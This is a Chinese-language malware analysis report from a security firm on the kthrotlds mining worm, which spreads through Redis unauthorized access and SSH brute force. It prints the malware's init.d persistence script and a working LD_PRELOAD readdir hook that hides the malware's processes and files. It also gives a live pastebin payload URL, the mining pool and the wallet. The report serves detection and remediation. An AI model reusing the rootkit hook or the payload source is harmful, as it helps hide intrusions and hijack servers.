> 原文链接: https://www.anquanke.com//post/id/172111 


# kthrotlds挖矿病毒分析报告


                                阅读量   
                                **412886**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">7</a>
                                </b>
                                                                                    



[![](https://p4.ssl.qhimg.com/t013c9809256c6f9196.jpg)](https://p4.ssl.qhimg.com/t013c9809256c6f9196.jpg)



作者：郑斯碟@默安科技应急响应中心

2019年3月1日，默安科技应急响应中心接到某合作伙伴的求助电话，有主机被病毒感染，经默安科技安全研究员郑斯碟研究分析发现，该病毒为之前的watchdogs的变种，通过Redis未授权访问漏洞及ssh弱口令进行突破植入，随后释放挖矿木马进行挖矿操作，并对内外网主机进行redis漏洞攻击及ssh暴力破解攻击。



## 0x1 病毒特征

要判断是否感染此病毒，可从以下几个方面入手：
1. 查看root/.ssh/中的密钥信息是否被清空。
1. 查看计划任务中是否存在以下任务信息
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01585af7b7c9aec57d.png)
1. 查看是否有以下进程信息
[![](https://p1.ssl.qhimg.com/t016169b8c45c565543.png)](https://p1.ssl.qhimg.com/t016169b8c45c565543.png)
1. 查看/usr/sbin目录下是否有kthrotlds文件
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016c76e114d7fec34d.png)
1. 查看/etc/init.d/下是否有netdns文件
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01cbb5ebdbad6f52d0.png)
1. 病毒程序执行后会消耗大量的主机cpu资源。
1. 查看/usr/local/lib/libcset.so
[![](https://p4.ssl.qhimg.com/t01033117179de0e37e.png)](https://p4.ssl.qhimg.com/t01033117179de0e37e.png)

请各位系统维护人员检查各自机子是否有以上特征，如果有以上特征，可联系默安科技安全应急响应中心获取病毒清除工具。

以下是对该病毒的分析过程：



## 0x2 针对kthrotlds的分析：

通过分析发现，该病毒文件还是采用了upx壳，只是对其中的魔数进行了修改：

UPX的魔数是：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0122ab6efdf4e026b1.png)

该病毒文件的魔数

[![](https://p0.ssl.qhimg.com/t0139179b9c45f872d2.png)](https://p0.ssl.qhimg.com/t0139179b9c45f872d2.png)

只要将模数修改一下即可，修改如下：

[![](https://p3.ssl.qhimg.com/t01737a03bc789cd1db.png)](https://p3.ssl.qhimg.com/t01737a03bc789cd1db.png)

修复后，使用upx -d 进行脱壳

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0174f0f7b0ec3b00fa.png)

可以看到，已经脱壳成功。

下面使用ida进行反编译

[![](https://p4.ssl.qhimg.com/t013511e0367dec5ccc.png)](https://p4.ssl.qhimg.com/t013511e0367dec5ccc.png)

函数名都是随机字符串，看下字符串，推断程序应该是使用golang写的，和之前的差不多。

[![](https://p0.ssl.qhimg.com/t0143df6695ffeb43b9.png)](https://p0.ssl.qhimg.com/t0143df6695ffeb43b9.png)

所以这里还是要使用之前的那个符号还原脚本对程序中的符号进行还原，脚本地址是：

[https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro](https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro)

还原后：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f9820b57bf541d93.png)

下面开始分析main函数

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0185ba26d8ebeba891.png)

下面是将kthrotlds通过github_com_hippies_LSD_LSDC_CopyFile函数将/tmp/kthrotlds拷贝到/usr/sbin/kthrotlds中。然后往/etc/init.d/中写入一个名叫netdns的文件，并通过chkconfig命令将netdns添加为开启启动项。

[![](https://p3.ssl.qhimg.com/t019602efb96317e624.png)](https://p3.ssl.qhimg.com/t019602efb96317e624.png)

可以发现在etc/init.d目录下确实存在netdns文件。

[![](https://p4.ssl.qhimg.com/t01396639251979ded9.png)](https://p4.ssl.qhimg.com/t01396639251979ded9.png)

通过文本查看工具打开这个文件，发现其是一个bash脚本，具体如下：

```
#! /bin/bash

#chkconfig: - 99 01

#description: kthrotlds daemon

#processname: /usr/sbin/kthrotlds

### BEGIN INIT INFO

# Provides:     /user/sbin/kthrotlds

# Required-Start:

# Required-Stop:

# Default-Start:        2 3 4 5

# Default-Stop:         0 1 6

# Short-Description: kthrotlds deamon

# Description:          kthrotlds deamon  守护进程

### END INIT INFO



LocalPath="/usr/sbin/kthrotlds"

name='kthrotlds'

pid_file="/tmp/.lsdpid"

stdout_log="/var/log/$name.log"

stderr_log="/var/log/$name.err"

get_pid()`{`

    cat "$pid_file"

`}`

is_running()`{`

    [ -f "$pid_file" ] &amp;&amp;/usr/sbin/kthrotlds -Pid $(get_pid) &gt; /dev/null 2&gt;&amp;1

`}`

case "$1" in

start)

    if is_running; then

        echo "Already started"

    else

        echo "Starting $name"

        $LocalPath &gt;&gt;"$stdout_log" 2&gt;&gt; "$stderr_log" &amp;

        echo $! &gt; "$pid_file"

        if ! is_running; then

        echo "Unable to start, see$stdout_log and $stderr_log"

        exit 1

        fi

    fi

;;

stop)

    if is_running; then

        echo -n "Stopping$name.."

        kill $(get_pid)

        for i in `{`1..10`}`

        do

            if ! is_running; then

                break

            fi

            echo -n "."

            sleep 1

        done

        echo

        if is_running; then

            echo "Not stopped; maystill be shutting down or shutdown may have failed"

            exit 1

        else

            echo "Stopped"

            if [ -f "$pid_file"]; then

                rm "$pid_file"

            fi

        fi

    else

        echo "Not running"

    fi

;;

restart)

    $0 stop

    if is_running; then

        echo "Unable to stop, will notattempt to start"

        exit 1

    fi

    $0 start

;;

status)

    if is_running; then

        echo "Running"

    else

        echo "Stopped"

        exit 1

    fi

;;

*)

echo "Usage: $0`{`start|stop|restart|status`}`"

exit 1

;;

esac

exit 0
```

大致的意思是查看进程列表，如果发现进程kthrotlds被kill掉了，则将其启动。

下面回到kthrolds源码的分析：

紧接着是一些清除操作，这里应该是清除之前版本残留的一些文件：

[![](https://p5.ssl.qhimg.com/t0150c0f8afc511c045.png)](https://p5.ssl.qhimg.com/t0150c0f8afc511c045.png)

然后往/usr/local/lib写入licset.c文件，并将其编译为/usr/local/lib/licset.so文件，并将这个so文件设置为预加载动态链接库。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014a8a11b52364336c.png)

具体的关于libcset.so的分析在文章的后半部分，下面继续分析main函数。

接着是进行计划任务的写入操作，释放挖矿木马ksoftirqds，及更新操作。

[![](https://p2.ssl.qhimg.com/t01a49a586d7517d02d.png)](https://p2.ssl.qhimg.com/t01a49a586d7517d02d.png)

以下是其计划任务中写入的命令：

[![](https://p2.ssl.qhimg.com/t016e245dd9a7788b8d.png)](https://p2.ssl.qhimg.com/t016e245dd9a7788b8d.png)

访问：[https://pastebin.com/raw/D8E71JBJ](https://pastebin.com/raw/D8E71JBJ)即可获得病毒执行脚本

通过解密其中的base64编码的数据：<br>
发现其和之前的脚本没有太多区别，这里主要将curl获取的图片文件重命名为了kthrotlds（原来是watchdogs）。

如需对脚本内容进行进行进一步的了解，请参考上一篇分析文章，这里就不做过多分析了：<br>
https://www.anquanke.com/post/id/171692



## 0x3 横向传播

下面我们看下病毒式如何进行横向传播的：

### 0x1 Readis攻击：

遍历内网ip及外网ip攻击redis服务器：

测试机上通过wireshark抓取到的redis攻击行为

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0132dbfc7f062cc9aa.png)<br>
攻击程序调用过程：

Main_main

-&gt;main_attack

-&gt;github_com_hippies_LSD_LSDA_Ago

-&gt;github_com_hippies_LSD_LSDA_Ago_func1

-&gt;github_com_hippies_LSD_LSDA_runtwo

-&gt;github_com_hippies_LSD_LSDA_run

-&gt;github_com_gomodule_redigo_redis_DiaTimeout

-&gt;github_com_gomodule_redigo_redis_Dial

-&gt;github_com_gomodule_redigo_redis__conn_Do

-&gt;github_com_gomodule_redigo_redis__conn_DoWithTimeout

-&gt;github_com_gomodule_redigo_redis__conn_writeCommand

相关代码：

[![](https://p2.ssl.qhimg.com/t0179fb2fcf9d771fbe.png)](https://p2.ssl.qhimg.com/t0179fb2fcf9d771fbe.png)

### 0x2 ssh爆破

测试机上通过wireshark抓取到的ssh爆破行为：

[![](https://p5.ssl.qhimg.com/t011f802aa56712b4fc.png)](https://p5.ssl.qhimg.com/t011f802aa56712b4fc.png)

攻击程序调用过程

Main_main

-&gt; main_attack

-&gt;github_com_hippies_LSD_LSDA_Bbgo

-&gt;github_com_hippies_LSD_LSDA_bgo_func1

-&gt;github_com_hippies_LSD_LSDA_cmdtwo

-&gt;github_com_hippies_LSD_LSDA_cmd

-&gt;Golang_org_x_crpyto_ssh_Client_NewSession

相关代码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t015900ae7c2ecbbdf8.png)

这里是攻击程序的入口（main_attack）主要有两个攻击模块，一个是ssh爆破，另一个式redis未授权攻击，与上一个版本一样。

[![](https://p2.ssl.qhimg.com/t01657aea39eca1d750.png)](https://p2.ssl.qhimg.com/t01657aea39eca1d750.png)



## 0x4 针对ksoftirqds的分析

下面我们来看下ksoftirqds这个文件。

通过分析发现其使用的还是xmr-stak这个挖矿系统

[![](https://p1.ssl.qhimg.com/t01be96a16669121fcf.png)](https://p1.ssl.qhimg.com/t01be96a16669121fcf.png)

该项目地址是：

[https://github.com/fireice-uk/xmr-stak](https://github.com/fireice-uk/xmr-stak)

通过字符串检索找到其矿池地址，发现矿池已经改变

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0109133beffd202d2e.png)

这里矿池地址为：

sg.minexmr.com:5555

进一步跟入找到其钱包地址

[![](https://p1.ssl.qhimg.com/t016a813984c04e19ec.png)](https://p1.ssl.qhimg.com/t016a813984c04e19ec.png)

其钱包id为：

47eCpELDZBiVoxDT1tBxCX7fFU4kcSTDLTW2FzYTuB1H3yzrKTtXLAVRsBWcsYpfQzfHjHKtQAJshNyTU88LwNY4Q3rHFYA

以下是该钱包账户的收益情况

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01487e2774ca97357a.png)



## 0x5 针对libcset.c的分析

在kthrotlds中，对libcset.c进行了编译，并将编译生成后的/usr/local/lib/libcset.so设置为预加载动态链接库。

[![](https://p2.ssl.qhimg.com/t012dd0c32fad4e002b.png)](https://p2.ssl.qhimg.com/t012dd0c32fad4e002b.png)

以下是libcset.c的函数列表

[![](https://p1.ssl.qhimg.com/t010d14e3458418cc16.png)](https://p1.ssl.qhimg.com/t010d14e3458418cc16.png)

很明显病毒是通过hook libc.so中的函数的方式将与病毒相关的信息进行了隐藏。

如readdir函数

```
struct dirent *

readdir (DIR * dirp)

`{`

  struct dirent *dir;

  if (!libc)`{`

        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);

        if (!libc)`{`

            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);

            if (!libc)`{`

                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);

                if (!libc)`{`

                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);

                `}`

            `}`

        `}`

  `}`

  if (!old_readdir)

    old_readdir = dlsym (libc, "readdir");



  do `{`

    dir = old_readdir (dirp);



    if(dir != NULL) `{`

        char dir_name[256];

        char process_name[256];

        if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp; strcmp(dir_name, "/proc") == 0 &amp;&amp; get_process_name(dir-&gt;d_name, process_name) &amp;&amp; strcmp(process_name, MAGIC_STRING) == 0)`{`

            return NULL;

        `}`else if (strcmp(process_name, MAGIC_DEAMON) == 0)`{`

            return NULL;

        `}`

    `}`

    if (dir != NULL

       &amp;&amp; (strcmp (dir-&gt;d_name, ".\0") || strcmp (dir-&gt;d_name, "/\0")))

      continue;

  `}`

  while (dir

        &amp;&amp; (strstr (dir-&gt;d_name, MAGIC_STRING) != 0 || strstr (dir-&gt;d_name, CONFIG_FILE) != 0 || strstr (dir-&gt;d_name, LIB_FILE) != 0));



  return dir;

`}`
```

这里是对readdir函数进行了hook，对其中的进程名(病毒进程名，kthrotlds)，病毒配置文件名，动态链接库名(libcset.so)进行了检查，隐藏查询结果中包含这三者的信息。其他的函数这里就不做过多分析了。



## 0x6 分析总结

1、相对于之前的watchdogs,其加壳方案并没有什么太大的改变，只是对于病毒程序的加固方面进行了一些修改，即将原本的upx壳的magic number改为了:4c 53 44 21。那么相应的应对措施就是，在脱壳之前，将其复原为55 50 58 21。

2、进行ssh爆破及redis攻击，目的是进行横向病毒传播，扩大挖矿僵尸网络的势力

3、通过inotify监控/bin文件目录，发现其并没有删除netstat命令，这是与watchdogs的区别之一。

4、ksofttirqds程序主要是使用xmr-stak挖矿程序挖掘门罗币

5、编译libcset.c并将libcset.so设置为预加载动态链接库，隐藏病毒相关。

6、之前版本是将watchdog程序设置为开机启动项，而当前版本是编写了一个名叫netdns的脚本将其设置为开机启动项，并作为kthrotlds的守护进程。

7、矿池及钱包地址：

矿池：

sg.minexmr.com:5555

钱包地址：

47eCpELDZBiVoxDT1tBxCX7fFU4kcSTDLTW2FzYTuB1H3yzrKTtXLAVRsBWcsYpfQzfHjHKtQAJshNyTU88LwNY4Q3rHFYA

8、域名：

[https://pastebin.com](https://pastebin.com)（未改变）

对应ip：

104.20.209.21（未改变）

9、相关Md5特征：

da7ee5683fb870bae61e9c4088a661e4

66613e2e4210dce89b562635b769bc21

83e651497c59a14ca8d5abab85565955

4c62c53ae69d8e9290aaccb5ee694716

f1bdc8b12f2ef0279cd265c79bd6fd9e

c7560dd3933774185ce19ddbee5e526c



## 0x6 加固建议

病毒程序可能是通过利用redis未授权漏洞植入，所以请做好redis方面的加固。

Redis未授权漏洞简介：Redis在默认配置下，会将服务绑定在0.0.0.0：6379上，即暴露在公网上。如果同时又没有开启相关的认证，就会导致任意用户访问redis服务，进行数据库操作，并且通过进一步利用，还可以获得系统权限。

以下是redis方面的加固建议：

1. 将修改redis配置文件，将服务绑定在本机127.0.0.1上。

2.修改redis.conf，设置访问认证，启用密码认证。<br>
3. 在防火墙处指定可访问redis服务的ip 。

4. 修改修改redis默认端口。

5. 禁用config指令防止恶意操作，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度。

6. 使用普通权限运行redis服务，这样即使攻击者获得了服务器权限也只是普通用户权限。

## 0x7 病毒处置办法

1）默安科技已针对病毒开发自动化清理脚本，脚本地址：

https://github.com/MoreSecLab/DDG_MalWare_Clean_Tool

3）建议使用默安科技哨兵云对全网服务器进行排查Redis未授权访问漏洞并进行安全加固，从源头上避免感染病毒。

4）紧急情况下，为避免内网大量传播，可以临时对被感染机器先进行断网隔离处理。

5）不影响业务的情况下，建议临时删除机器上.ssh/known_hosts和登录密钥文件。
